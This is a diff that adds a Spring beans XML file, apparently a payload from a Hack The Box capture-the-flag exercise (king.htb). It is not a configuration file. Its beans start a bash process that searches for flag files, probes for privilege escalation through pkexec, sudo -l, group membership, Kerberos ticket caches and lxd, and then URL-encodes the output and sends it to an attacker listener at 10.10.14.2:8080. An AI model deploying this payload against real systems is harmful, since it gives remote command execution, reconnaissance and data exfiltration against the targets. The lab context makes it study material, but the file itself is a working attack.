@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+       http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder">
+        <constructor-arg>
+            <list>
+                <value>/bin/bash</value>
+                <value>-c</value>
+                <value><![CDATA[find / -name "user.txt" -o -name "root.txt" 2>/dev/null; echo "---POLKIT---"; pkexec --version 2>&1; echo "---GROUPS---"; id; groups; echo "---SUDOERS---"; sudo -l 2>&1; echo "---SVCMQ HOME---"; ls -la /home/svc_mq@king.htb/ 2>/dev/null; echo "---KRB TICKETS---"; ls -la /tmp/krb5cc_* 2>/dev/null; echo "---LXC---"; which lxc 2>/dev/null; id | grep lxd]]></value>
+            </list>
+        </constructor-arg>
+    </bean>
+    <bean id="proc" factory-bean="pb" factory-method="start"/>
+    <bean id="procOut" factory-bean="proc" factory-method="getInputStream"/>
+    <bean id="outBytes" class="org.springframework.util.FileCopyUtils"
+          factory-method="copyToByteArray">
+        <constructor-arg ref="procOut"/>
+    </bean>
+    <bean id="outStr" class="java.lang.String">
+        <constructor-arg ref="outBytes"/>
+    </bean>
+    <bean id="outUrl" class="java.net.URL" depends-on="outStr">
+        <constructor-arg value="#{'http://10.10.14.2:8080/enum2?v=' + T(java.net.URLEncoder).encode(@outStr,'UTF-8')}"/>
+    </bean>
+    <bean id="outReq" factory-bean="outUrl" factory-method="openStream" depends-on="outUrl"/>
+</beans>
